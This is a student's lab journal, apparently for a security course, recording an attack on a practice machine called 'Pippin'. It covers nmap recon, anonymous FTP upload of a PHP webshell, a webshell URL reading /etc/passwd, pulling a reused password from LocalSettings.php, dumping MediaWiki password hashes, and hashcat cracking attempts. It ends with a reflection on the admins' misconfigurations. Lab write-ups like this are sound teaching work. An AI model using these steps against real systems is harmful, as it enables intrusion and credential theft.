# Week 7 Tech Journal

## Exploiting Pippin

### Active Recon

* `nmap -sV 10.0.5.25 -p 1-1000`
* Probed httpd by visiting webpage
* Probed ssh by attempting to log in
* Probed ftp by attempting to log in
  * ftp probe resulted in a message declaring anonymous logins only, prompting me to log in anonymously

### ftp

* `ftp anonymous@10.0.5.25`
* press enter to bypass password prompt
* `put` to upload files
* `get` to download files
* `ls` to view directory
* `cd` to change directories

### Webshell
* Stored in /usr/share/webshells on Kali
* Simple php webshell allows simple commands in url
  * `http://10.0.5.25/upload/simple-webshell.php?cmd=cat+/etc/passwd`
* Was able to find user account using this method

### mySQL
* pulling LocalSettings.php showed password for mySQL database, and was also password for named user
* `mysql -u peregrin.took -p`
* `show databased;`
* `use mediawiki;`
* `show tables;`
* `describe user;`
* `select user_name, user_password from user;`
  * This delivered a username along with a hashed password

### Hashcat
> I was unable to crack this hash. Here are the commands I attemped to use.
* `hashcat -m 12100 -w 4 -a 0 -o cracked.txt pip.hash.txt wordlist.txt`
* `hashcat -m12100 pip.hash.txt -w4 -a0 wordlist.txt`
> Here are the variations of the hash I tried with the above commands
* `Pippin:pbkdf2:sha512:30000:64:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg==`
* `Pippin:pbkdf2:hmac:sha512:30000:64:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg==`
* `pbkdf2:sha512:30000:64:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg==`
* `sha512:30000:64:7zMbdjXKrFDDq4CRF5q9ow==:49ImFWdWRVz2dCDsJPj+P0Xovz153VenjKk7npuK7u5xgo21IUh+eY0QH8fQxdH/Cjx3zxZyQcfNChAnP11GNg==`
> I created my wordlist with the following command
* `cat /usr/share/wordlists/rockyou.txt | grep '^p' > wordlist.txt`

### Reflection

#### What did the admins do wrong?
* ftp should not have been configured to allow anonymous access
* The upload folder should not have had such unrestrictive permissions
* The LocalSettings.php file should not have been stored in an unprotected directory
* The admins should not have used the same mySQL root password for a user account
* The system usernames and hashes should not have been stored in a vulnerable mySQL database

#### Where did I struggle?
* I resorted to the hint video because the idea of a webshell did not cross my mind
* The hint video also clued me in to the LocalSettings.php file
* I struggled with the hash cracking, so I resorted to the hint video for help
